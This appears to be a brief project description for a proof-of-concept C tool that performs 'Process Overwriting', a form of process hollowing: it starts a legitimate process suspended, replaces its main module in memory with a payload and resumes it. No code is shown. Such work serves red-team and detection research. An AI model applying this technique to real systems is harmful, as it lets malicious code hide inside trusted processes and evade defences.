  This project provides a proof-of-concept implementation of the "Process Overwriting" (a form of Process Hollowing) technique in plain C. The injector launches a legitimate target process in a suspended state and then overwrites its main executable module in memory with a custom payload. The main thread's context is then updated to point to the payload's entry point, and the process is resumed.
